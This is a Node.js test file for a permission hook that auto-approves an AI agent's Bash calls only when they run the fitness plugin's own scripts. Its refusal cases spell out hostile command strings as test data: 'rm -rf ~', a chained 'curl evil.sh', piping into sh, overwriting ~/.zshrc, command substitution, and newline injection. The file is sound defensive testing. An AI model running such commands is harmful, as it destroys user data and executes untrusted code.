import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { isOwnScriptCall } from "../hooks/approve-plugin-scripts.mjs";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "hooks", "approve-plugin-scripts.mjs");
const S = (name) => join(ROOT, "scripts", name);

test("approves the plugin's own scripts, quoted or not", () => {
  for (const cmd of [
    `node '${S("log-workout.mjs")}' --exercise "Push-ups" --count 15 --unit reps`,
    `node "${S("stats.mjs")}" --since today`,
    `node ${S("state.mjs")} pause "2 hours"`,
    `node "${S("state.mjs")}" status`,
  ]) assert.equal(isOwnScriptCall(cmd), true, cmd);
});

test("refuses anything that could do more than run a plugin script", () => {
  for (const cmd of [
    `node "${S("stats.mjs")}" && rm -rf ~`,
    `node "${S("stats.mjs")}"; curl evil.sh`,
    `node "${S("stats.mjs")}" | sh`,
    `node "${S("stats.mjs")}" > ~/.zshrc`,
    `node "${S("stats.mjs")}" $(whoami)`,
    `node "${S("stats.mjs")}" \`id\``,
    `node "${S("export-workouts.mjs")}" --format csv`,
    `node "${S("export-workouts.mjs")}" --out ~/.zshrc`,
    `node "${S("state.mjs")}" pause --data-dir /tmp/x`,
    `node "${S("../hooks/stop-fitness-check.mjs")}"`,
    `node "${S("lib/paths.mjs")}"`,
    `node /tmp/scripts/stats.mjs`,
    `node -e "require('fs')" "${S("stats.mjs")}"`,
    `bash "${S("stats.mjs")}"`,
    `node "${S("stats.mjs")}`,
    `node "${S("stats.mjs")}"\nrm -rf ~`,
    ``,
  ]) assert.equal(isOwnScriptCall(cmd), false, cmd);
});

test("hook prints an allow decision only for approved Bash calls", () => {
  const run = (input) => spawnSync("node", [HOOK], { input: JSON.stringify(input), encoding: "utf-8" });
  const ok = run({ tool_name: "Bash", tool_input: { command: `node "${S("stats.mjs")}" --since today` } });
  assert.equal(ok.status, 0);
  assert.equal(JSON.parse(ok.stdout).hookSpecificOutput.permissionDecision, "allow");
  const no = run({ tool_name: "Bash", tool_input: { command: "rm -rf ~" } });
  assert.equal(no.status, 0);
  assert.equal(no.stdout, "");
  const garbage = spawnSync("node", [HOOK], { input: "not json", encoding: "utf-8" });
  assert.equal(garbage.status, 0);
  assert.equal(garbage.stdout, "");
});
